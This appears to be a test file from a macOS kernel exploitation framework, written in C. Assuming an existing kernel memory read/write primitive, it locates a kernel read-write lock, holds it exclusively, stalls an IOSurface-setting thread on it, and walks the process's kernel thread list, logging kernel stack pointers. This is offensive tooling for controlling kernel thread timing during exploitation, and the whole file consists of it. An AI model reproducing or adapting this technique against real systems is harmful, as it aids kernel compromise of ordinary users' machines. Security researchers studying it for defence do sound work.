
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include <dispatch/dispatch.h>

#include <xpl/memory/kmem.h>
#include <xpl/memory/kmem_remote.h>
#include <xpl/slider/kernel.h>
#include <xpl/xnu/proc.h>
#include <xpl/xnu/thread.h>
#include <xpl/util/lck_rw.h>
#include <xpl/util/dispatch.h>
#include <xpl/util/ptrauth.h>
#include <xpl/util/assert.h>
#include <xpl/util/log.h>

#include <macos/kernel.h>

#include "test_lck_rw.h"


IOSurfaceRef iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xpl_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void iosurface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "xpl_key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
}


void test_lck_rw(void) {
    uintptr_t proc = xpl_proc_current_proc();
    
    xpl_log_info("proc: %p", (void*)proc);

    uintptr_t kheap_default = xpl_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xpl_kmem_read_uint64(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET);
    uintptr_t lck_rw = kh_large_map + TYPE_VM_MAP_MEM_LCK_RW_OFFSET;
    xpl_log_info("locking %p", (void*)lck_rw);
    
    xpl_log_info("lock start");
    xpl_lck_rw_t util_lock = xpl_lck_rw_lock_exclusive(lck_rw);
    xpl_log_info("lock done");

    uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
    dispatch_semaphore_t sem_create_start = dispatch_semaphore_create(0);
    
    dispatch_async(xpl_dispatch_queue(), ^() {
        *waiting_thread = xpl_thread_current_thread();
        dispatch_semaphore_signal(sem_create_start);
        
        IOSurfaceRef surface = iosurface_create();
        size_t array_len = (16384 * 3) / 8;
        xpl_log_info("begin set value");
        iosurface_add_values(surface, 0, array_len);
        xpl_log_info("done set value");
    });

    dispatch_semaphore_wait(sem_create_start, DISPATCH_TIME_FOREVER);
    xpl_log_info("waiting thread: %p", (void*)*waiting_thread);
    
    int error = xpl_lck_rw_wait_for_contention(util_lock, *waiting_thread, NULL);
    if (error) {
        xpl_log_info("lck_rw_wait failed, err: %d", error);
    }
    
    xpl_log_info("pid: %d", xpl_kmem_read_uint32(proc, TYPE_PROC_MEM_P_PID_OFFSET));
    
    uintptr_t task = xpl_ptrauth_strip(xpl_kmem_read_uint64(proc, TYPE_PROC_MEM_TASK_OFFSET));
    xpl_log_info("num_threads: %d", xpl_kmem_read_uint32(task, TYPE_TASK_MEM_THREAD_COUNT_OFFSET));
    
    uintptr_t cursor = xpl_kmem_read_uint64(task, TYPE_TASK_MEM_THREADS_OFFSET);
    while (cursor != 0 && cursor != task + TYPE_TASK_MEM_THREADS_OFFSET) {
        uintptr_t kernel_stack = xpl_kmem_read_uint64(cursor, TYPE_THREAD_MEM_KERNEL_STACK_OFFSET);
        uintptr_t kstackptr = xpl_kmem_read_uint64(cursor, TYPE_THREAD_MEM_MACHINE_OFFSET + TYPE_MACHINE_THREAD_MEM_KSTACKPTR_OFFSET);
        int state = xpl_kmem_read_int32(cursor, TYPE_THREAD_MEM_STATE_OFFSET);

        xpl_log_info("thread: %p\t kernel stack: %p\t kstackptr: %p\t state: %d", (void*)cursor, (void*)kernel_stack, (void*)kstackptr, state);
        cursor = xpl_kmem_read_uint64(cursor, TYPE_THREAD_MEM_TASK_THREADS_OFFSET);
    }


    xpl_log_info("release start");
    xpl_lck_rw_lock_done(&util_lock);
    xpl_log_info("release done");
}
